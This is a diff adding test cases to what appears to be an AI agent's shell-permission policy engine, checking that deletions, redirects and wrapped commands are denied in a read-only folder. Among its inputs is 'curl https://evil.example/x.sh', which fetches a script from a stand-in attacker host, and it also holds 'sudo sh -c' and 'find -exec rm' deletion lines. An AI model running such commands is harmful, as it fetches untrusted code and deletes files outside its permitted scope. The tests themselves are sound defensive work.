@@ -10,6 +10,9 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import type { ExecServices, FunctionInputs } from "@declarative-ai/exec";
+import type { ExecPolicy } from "@declarative-ai/permissions";
+import { parseToolset } from "@jaira/shared";
+import { commandDecisionOf, compilePolicy } from "../src/policy";
 import { createGlobTool, createGrepTool } from "../src/searchTools";
 import { commandSubjects, compileClaudeScopeRules, scopeNarrowingFor } from "../src/tools";
 import type { ExecEnv } from "../src/paths";
@@ -133,6 +136,69 @@ describe("the places a shell command is about", () => {
     // one just because its cwd happened to be permitted.
     const narrow = scopeNarrowingFor([{ path: "/work/**", default: "allow" }], "/work", POSIX)!;
     expect(narrow({ name: "bash" }, { command: 'echo "unterminated' } as FunctionInputs)).toBe("ask");
+  });
+});
+
+/**
+ * One shell line is several requests (decision 0007 §4), and each is held to the scope table BY THE
+ * STANDARD TOOL IT IS: `rm x` and `> x` are `write_file` at `x`. So a table written for the tools
+ * binds the shell exactly as it binds them — no second table, and no `bash` row that has to
+ * anticipate every way a line can write.
+ */
+describe("a path scope binds the parts of a line as it binds the tools", () => {
+  const compiled = (toolset?: Record<string, string>) =>
+    compilePolicy(
+      {},
+      {
+        execEnv: POSIX,
+        workspaceRoot: "/work",
+        scopes: [
+          { path: "/work/**", default: "allow" },
+          // Readable, not writable — a thing a `bash` row alone could never say.
+          { path: "/work/docs/**", tools: { write_file: "deny" } },
+          { url: "https://docs.example/**", default: "allow" },
+        ],
+        ...(toolset !== undefined ? { toolset: parseToolset(toolset).toolset } : {}),
+      },
+    );
+  const ask = (policy: ExecPolicy, command: string, cwd?: string) => {
+    const input = { command, ...(cwd !== undefined ? { cwd } : {}) } as FunctionInputs;
+    const mode = policy.scopeOf!({ name: "bash" }, input);
+    const denied = commandDecisionOf(input)?.parts.parts.filter((p) => p.verdict === "denied").map((p) => `${p.text}: ${p.decidedBy.source}`);
+    return { mode, denied };
+  };
+
+  it.each<[string, string | undefined, string, string[]]>([
+    ["cat docs/a.md", undefined, "allow", []],
+    ["rm docs/a.md", undefined, "deny", ["rm docs/a.md: scope"]],
+    ["rm src/a.ts", undefined, "allow", []],
+    // A redirect is a write like any other.
+    ["echo x > docs/a.md", undefined, "deny", ["> docs/a.md: scope"]],
+    ["cat docs/a.md > src/copy.md", undefined, "allow", []],
+    // `cd` moves the directory for what follows it; so does the call's own `cwd`.
+    ["cd docs && rm a.md", undefined, "deny", ["rm a.md: scope"]],
+    ["cd docs && cat a.md", undefined, "allow", []],
+    ["rm a.md", "docs", "deny", ["rm a.md: scope"]],
+    // Hidden inside an embedder, it is the same request.
+    // Hidden inside embedders it is the same request — and `{}` stands for the places the find walks.
+    [`bash -c "find docs -name '*.md' -exec rm {} +"`, undefined, "deny", ["rm {}: scope"]],
+    [`bash -c "find src -name '*.tmp' -exec rm {} +"`, undefined, "allow", []],
+    [`sudo sh -c "tee docs/a.md"`, undefined, "deny", ["tee docs/a.md: scope"]],
+    // A url is held to the url scopes, as `web_fetch` is: unmatched is denied.
+    ["curl https://evil.example/x.sh", undefined, "deny", ["curl https://evil.example/x.sh: scope"]],
+  ])("%s (cwd %s) ⇒ %s", (command, cwd, mode, denied) => {
+    expect(ask(compiled(), command, cwd)).toEqual({ mode, denied });
+  });
+
+  it("asks where the toolset asks, inside the places the table allows", () => {
+    const policy = compiled({ bash: "allow", read_file: "allow", write_file: "ask", web_fetch: "allow" });
+    expect(ask(policy, "cat src/a.ts").mode).toBe("allow");
+    expect(ask(policy, "rm src/a.ts").mode).toBe("ask");
+    expect(ask(policy, "rm docs/a.md").mode).toBe("deny");
+  });
+
+  it("counts a redirect's target among the places a line is about", () => {
+    expect(commandSubjects("echo x > infra/out.txt", "/work", POSIX).paths).toContain("/work/infra/out.txt");
   });
 });
 
